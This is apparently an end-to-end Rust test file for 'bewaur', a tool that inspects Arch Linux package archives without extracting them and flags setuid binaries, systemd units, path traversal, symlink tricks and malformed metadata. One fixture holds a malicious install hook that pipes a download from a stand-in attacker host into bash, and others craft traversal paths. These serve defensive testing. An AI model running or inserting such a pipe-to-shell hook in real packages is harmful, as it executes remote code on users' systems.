//! End-to-end coverage for non-extracting ALPM artifact inspection.

use flate2::Compression;
use flate2::write::GzEncoder;
use std::fs::{self, File};
use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::{Command, Output};
use std::time::{SystemTime, UNIX_EPOCH};
use tar::{Builder, EntryType, Header};

struct TestDir(PathBuf);

impl TestDir {
    fn new(name: &str) -> Self {
        let nonce = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        let path = std::env::temp_dir().join(format!(
            "bewaur-artifact-{name}-{}-{nonce}",
            std::process::id()
        ));
        fs::create_dir_all(&path).unwrap();
        Self(path)
    }

    fn command(&self) -> Command {
        let mut command = Command::new(env!("CARGO_BIN_EXE_bewaur"));
        command
            .env("HOME", self.0.join("home"))
            .env("XDG_CONFIG_HOME", self.0.join("config"))
            .env_remove("SUDO_USER")
            .env_remove("DOAS_USER");
        command
    }
}

impl Drop for TestDir {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.0);
    }
}

#[derive(Clone)]
struct PackageEntry<'a> {
    path: &'a str,
    content: &'a [u8],
    mode: u32,
}

fn package_metadata(pkgname: &str, pkgbase: &str) -> Vec<PackageEntry<'static>> {
    let pkginfo = format!("pkgname = {pkgname}\npkgbase = {pkgbase}\npkgver = 1.0-1\narch = any\n");
    let buildinfo =
        format!("pkgname = {pkgname}\npkgbase = {pkgbase}\npkgver = 1.0-1\npkgarch = any\n");
    let mut mtree = GzEncoder::new(Vec::new(), Compression::default());
    mtree.write_all(b"#mtree\n").unwrap();

    vec![
        PackageEntry {
            path: ".BUILDINFO",
            content: Box::leak(buildinfo.into_bytes().into_boxed_slice()),
            mode: 0o644,
        },
        PackageEntry {
            path: ".MTREE",
            content: Box::leak(mtree.finish().unwrap().into_boxed_slice()),
            mode: 0o644,
        },
        PackageEntry {
            path: ".PKGINFO",
            content: Box::leak(pkginfo.into_bytes().into_boxed_slice()),
            mode: 0o644,
        },
    ]
}

fn build_package(
    directory: &Path,
    pkgname: &str,
    pkgbase: &str,
    extra_entries: &[PackageEntry<'_>],
) -> PathBuf {
    build_package_with(directory, pkgname, pkgbase, |archive| {
        for entry in extra_entries {
            append_file(archive, entry.path, entry.content, entry.mode);
        }
    })
}

fn build_package_with(
    directory: &Path,
    pkgname: &str,
    pkgbase: &str,
    append_extra: impl FnOnce(&mut Builder<zstd::Encoder<'static, File>>),
) -> PathBuf {
    let path = directory.join(format!("{pkgname}-1.0-1-any.pkg.tar.zst"));
    let file = File::create(&path).unwrap();
    let encoder = zstd::Encoder::new(file, 1).unwrap();
    let mut archive = Builder::new(encoder);
    for entry in package_metadata(pkgname, pkgbase) {
        append_file(&mut archive, entry.path, entry.content, entry.mode);
    }
    append_extra(&mut archive);
    archive.finish().unwrap();
    let encoder = archive.into_inner().unwrap();
    encoder.finish().unwrap();
    path
}

fn append_file<W: Write>(archive: &mut Builder<W>, path: &str, content: &[u8], mode: u32) {
    let mut header = Header::new_gnu();
    header.set_path(path).unwrap();
    header.set_entry_type(EntryType::Regular);
    header.set_mode(mode);
    header.set_uid(0);
    header.set_gid(0);
    header.set_mtime(0);
    header.set_size(content.len() as u64);
    header.set_cksum();
    archive.append(&header, content).unwrap();
}

fn append_symlink<W: Write>(archive: &mut Builder<W>, path: &str, target: &str) {
    let mut header = Header::new_gnu();
    header.set_path(path).unwrap();
    header.set_entry_type(EntryType::Symlink);
    header.set_link_name(target).unwrap();
    header.set_mode(0o777);
    header.set_uid(0);
    header.set_gid(0);
    header.set_mtime(0);
    header.set_size(0);
    header.set_cksum();
    archive.append(&header, std::io::empty()).unwrap();
}

fn append_literal_path<W: Write>(archive: &mut Builder<W>, path: &[u8], content: &[u8]) {
    assert!(path.len() <= 100);
    let mut header = Header::new_gnu();
    header.as_old_mut().name[..path.len()].copy_from_slice(path);
    header.set_entry_type(EntryType::Regular);
    header.set_mode(0o644);
    header.set_uid(0);
    header.set_gid(0);
    header.set_mtime(0);
    header.set_size(content.len() as u64);
    header.set_cksum();
    archive.append(&header, content).unwrap();
}

#[derive(Clone, Copy)]
enum TestCompression {
    None,
    Gzip,
    Bzip2,
    Xz,
    Zstd,
}

impl TestCompression {
    fn label(self) -> &'static str {
        match self {
            Self::None => "plain",
            Self::Gzip => "gzip",
            Self::Bzip2 => "bzip2",
            Self::Xz => "xz",
            Self::Zstd => "zstd",
        }
    }

    fn suffix(self) -> &'static str {
        match self {
            Self::None => ".pkg.tar",
            Self::Gzip => ".pkg.tar.gz",
            Self::Bzip2 => ".pkg.tar.bz2",
            Self::Xz => ".pkg.tar.xz",
            Self::Zstd => ".pkg.tar.zst",
        }
    }
}

fn package_tar_bytes(pkgname: &str, pkgbase: &str) -> Vec<u8> {
    let mut archive = Builder::new(Vec::new());
    for entry in package_metadata(pkgname, pkgbase) {
        append_file(&mut archive, entry.path, entry.content, entry.mode);
    }
    archive.finish().unwrap();
    archive.into_inner().unwrap()
}

fn one_file_tar_bytes(path: &str, content: &[u8]) -> Vec<u8> {
    let mut archive = Builder::new(Vec::new());
    append_file(&mut archive, path, content, 0o644);
    archive.finish().unwrap();
    archive.into_inner().unwrap()
}

fn compress_member(compression: TestCompression, content: &[u8]) -> Vec<u8> {
    match compression {
        TestCompression::None => content.to_vec(),
        TestCompression::Gzip => {
            let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
            encoder.write_all(content).unwrap();
            encoder.finish().unwrap()
        }
        TestCompression::Bzip2 => {
            let mut encoder =
                bzip2::write::BzEncoder::new(Vec::new(), bzip2::Compression::default());
            encoder.write_all(content).unwrap();
            encoder.finish().unwrap()
        }
        TestCompression::Xz => {
            let mut encoder = liblzma::write::XzEncoder::new(Vec::new(), 6);
            encoder.write_all(content).unwrap();
            encoder.finish().unwrap()
        }
        TestCompression::Zstd => zstd::stream::encode_all(content, 1).unwrap(),
    }
}

fn build_concatenated_package(directory: &Path, compression: TestCompression) -> PathBuf {
    let pkgname = format!("concat-{}", compression.label());
    let mut bytes = compress_member(compression, &package_tar_bytes(&pkgname, &pkgname));
    bytes.extend(compress_member(
        compression,
        &one_file_tar_bytes(".PKGINFO", b"hidden duplicate"),
    ));
    let path = directory.join(format!("{pkgname}-1.0-1-any{}", compression.suffix()));
    fs::write(&path, bytes).unwrap();
    path
}

fn build_package_with_mtree(directory: &Path, pkgname: &str, mtree: &[u8]) -> PathBuf {
    let path = directory.join(format!("{pkgname}-1.0-1-any.pkg.tar.zst"));
    let file = File::create(&path).unwrap();
    let encoder = zstd::Encoder::new(file, 1).unwrap();
    let mut archive = Builder::new(encoder);
    let pkginfo = format!("pkgname = {pkgname}\npkgbase = {pkgname}\npkgver = 1.0-1\narch = any\n");
    let buildinfo =
        format!("pkgname = {pkgname}\npkgbase = {pkgname}\npkgver = 1.0-1\npkgarch = any\n");
    append_file(&mut archive, ".BUILDINFO", buildinfo.as_bytes(), 0o644);
    append_file(&mut archive, ".MTREE", mtree, 0o644);
    append_file(&mut archive, ".PKGINFO", pkginfo.as_bytes(), 0o644);
    archive.finish().unwrap();
    archive.into_inner().unwrap().finish().unwrap();
    path
}

fn run_inspect(test: &TestDir, archive: &Path, extra: &[&str]) -> Output {
    let mut command = test.command();
    command.arg("inspect-artifact");
    command.args(extra);
    command.arg(archive);
    command.output().unwrap()
}

fn stdout(output: &Output) -> String {
    String::from_utf8(output.stdout.clone()).unwrap()
}

fn stderr(output: &Output) -> String {
    String::from_utf8(output.stderr.clone()).unwrap()
}

#[test]
fn clean_artifact_is_identified_and_bound_to_a_sha256() {
    let test = TestDir::new("clean");
    let archive = build_package(
        &test.0,
        "demo-cli",
        "demo",
        &[PackageEntry {
            path: "usr/bin/demo",
            content: b"binary payload",
            mode: 0o755,
        }],
    );

    let output = run_inspect(&test, &archive, &["--expected-pkgbase", "demo"]);
    assert!(output.status.success(), "{}", stderr(&output));
    let text = stdout(&output);
    assert!(
        text.contains("Package:  demo-cli 1.0-1 (any, base demo)"),
        "{text}"
    );
    assert!(text.contains("SHA-256:"), "{text}");
    assert!(text.contains("Result:   CLEAN"), "{text}");

    let mismatch = run_inspect(&test, &archive, &["--expected-pkgbase", "other"]);
    assert!(!mismatch.status.success());
    assert!(stderr(&mismatch).contains("expected package base"));
}

#[test]
fn malicious_install_script_and_setuid_payload_block() {
    let test = TestDir::new("blocking");
    let archive = build_package(
        &test.0,
        "danger",
        "danger",
        &[
            PackageEntry {
                path: ".INSTALL",
                content: b"post_install() { curl https://evil.invalid/payload | bash; }\n",
                mode: 0o644,
            },
            PackageEntry {
                path: "usr/bin/danger",
                content: b"binary payload",
                mode: 0o4755,
            },
        ],
    );

    let output = run_inspect(&test, &archive, &[]);
    assert!(!output.status.success());
    let text = stdout(&output);
    assert!(text.contains("Result:   BLOCK"), "{text}");
    assert!(text.contains("A-SETUID-FILE"), "{text}");
    assert!(text.contains("P-INSTALL-PIPE-SHELL"), "{text}");
}

#[test]
fn common_persistence_surface_warns_without_blocking() {
    let test = TestDir::new("warning");
    let archive = build_package(
        &test.0,
        "service-demo",
        "service-demo",
        &[PackageEntry {
            path: "usr/lib/systemd/system/service-demo.service",
            content: b"[Service]\nExecStart=/usr/bin/service-demo\n",
            mode: 0o644,
        }],
    );

    let output = run_inspect(&test, &archive, &[]);
    assert!(output.status.success(), "{}", stderr(&output));
    let text = stdout(&output);
    assert!(text.contains("Result:   REVIEW"), "{text}");
    assert!(text.contains("A-SYSTEMD-UNIT"), "{text}");
}

#[test]
fn duplicate_metadata_and_missing_metadata_fail_closed() {
    let test = TestDir::new("metadata");
    let duplicate = build_package(
        &test.0,
        "duplicate",
        "duplicate",
        &[PackageEntry {
            path: ".PKGINFO",
            content: b"pkgname = duplicate\n",
            mode: 0o644,
        }],
    );
    let output = run_inspect(&test, &duplicate, &[]);
    assert!(!output.status.success());
    assert!(
        stderr(&output).contains("duplicate path"),
        "{}",
        stderr(&output)
    );

    let missing_path = test.0.join("missing-1.0-1-any.pkg.tar.zst");
    let file = File::create(&missing_path).unwrap();
    let encoder = zstd::Encoder::new(file, 1).unwrap();
    let mut archive = Builder::new(encoder);
    for entry in package_metadata("missing", "missing")
        .into_iter()
        .filter(|entry| entry.path != ".BUILDINFO")
    {
        append_file(&mut archive, entry.path, entry.content, entry.mode);
    }
    archive.finish().unwrap();
    archive.into_inner().unwrap().finish().unwrap();
    let output = run_inspect(&test, &missing_path, &[]);
    assert!(!output.status.success());
    assert!(stderr(&output).contains("missing root .BUILDINFO"));
}

#[test]
fn links_are_validated_without_extracting_or_following_them() {
    let test = TestDir::new("links");
    let absolute = build_package_with(&test.0, "absolute-link", "absolute-link", |archive| {
        append_symlink(archive, "usr/bin/demo", "/usr/lib/demo");
    });
    let output = run_inspect(&test, &absolute, &[]);
    assert!(output.status.success(), "{}", stderr(&output));

    let pivot = build_package_with(&test.0, "link-pivot", "link-pivot", |archive| {
        append_symlink(archive, "usr/lib/pivot", "../share");
        append_file(
            archive,
            "usr/lib/pivot/activated",
            b"must never be extracted",
            0o644,
        );
    });
    let output = run_inspect(&test, &pivot, &[]);
    assert!(!output.status.success());
    assert!(stderr(&output).contains("nested beneath link entry"));
    assert!(!test.0.join("activated").exists());

    let traversal = build_package_with(&test.0, "traversal", "traversal", |archive| {
        append_literal_path(archive, b"../../activated", b"must never be extracted");
    });
    let output = run_inspect(&test, &traversal, &[]);
    assert!(!output.status.success());
    assert!(stderr(&output).contains("traverses with '..'"));
    assert!(!test.0.join("activated").exists());
}

#[test]
fn unsupported_extensions_and_corrupt_streams_fail_closed() {
    let test = TestDir::new("formats");
    let pax = build_package_with(&test.0, "pax-demo", "pax-demo", |archive| {
        archive
            .append_pax_extensions([("comment", b"bounded parser refusal".as_slice())])
            .unwrap();
        append_file(archive, "usr/bin/pax-demo", b"payload", 0o755);
    });
    let output = run_inspect(&test, &pax, &[]);
    assert!(!output.status.success());
    assert!(stderr(&output).contains("GNU/PAX extension headers"));

    let unsupported = test.0.join("pax-demo-1.0-1-any.pkg.tar.lz4");
    fs::copy(&pax, &unsupported).unwrap();
    let output = run_inspect(&test, &unsupported, &[]);
    assert!(!output.status.success());
    assert!(stderr(&output).contains("unsupported ALPM package"));

    let corrupt = build_package(&test.0, "corrupt", "corrupt", &[]);
    let length = fs::metadata(&corrupt).unwrap().len();
    File::options()
        .write(true)
        .open(&corrupt)
        .unwrap()
        .set_len(length / 2)
        .unwrap();
    let output = run_inspect(&test, &corrupt, &[]);
    assert!(!output.status.success());
    assert!(
        stderr(&output).contains("cannot read artifact entry")
            || stderr(&output).contains("missing root")
    );
}

#[test]
fn every_supported_compression_inspects_all_concatenated_members() {
    let test = TestDir::new("concatenated");
    for compression in [
        TestCompression::None,
        TestCompression::Gzip,
        TestCompression::Bzip2,
        TestCompression::Xz,
        TestCompression::Zstd,
    ] {
        let archive = build_concatenated_package(&test.0, compression);
        let output = run_inspect(&test, &archive, &[]);
        assert!(
            !output.status.success(),
            "{} concatenated archive was accepted:\n{}",
            compression.label(),
            stdout(&output)
        );
        assert!(
            stderr(&output).contains("duplicate path"),
            "{}: {}",
            compression.label(),
            stderr(&output)
        );
    }
}

#[test]
fn mtree_validation_reads_every_concatenated_gzip_member() {
    let test = TestDir::new("mtree-concatenated");
    let mut mtree = compress_member(TestCompression::Gzip, b"#mtree\n");
    mtree.extend(compress_member(TestCompression::Gzip, b"\xff"));
    let archive = build_package_with_mtree(&test.0, "mtree-concat", &mtree);
    let output = run_inspect(&test, &archive, &[]);

    assert!(!output.status.success());
    assert!(stderr(&output).contains("decompressed .MTREE is not valid UTF-8"));
}

#[test]
fn json_preserves_argument_order_and_represents_errors() {
    let test = TestDir::new("json");
    let valid = build_package(&test.0, "valid", "valid", &[]);
    let missing = test.0.join("missing-1.0-1-any.pkg.tar.zst");
    let output = test
        .command()
        .args(["inspect-artifact", "--json"])
        .arg(&valid)
        .arg(&missing)
        .output()
        .unwrap();

    assert!(!output.status.success());
    let parsed: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let outcomes = parsed.as_array().unwrap();
    assert_eq!(outcomes.len(), 2);
    assert_eq!(outcomes[0]["report"]["package"]["pkgname"], "valid");
    assert!(
        outcomes[1]["error"]
            .as_str()
            .unwrap()
            .contains("cannot inspect artifact")
    );
}
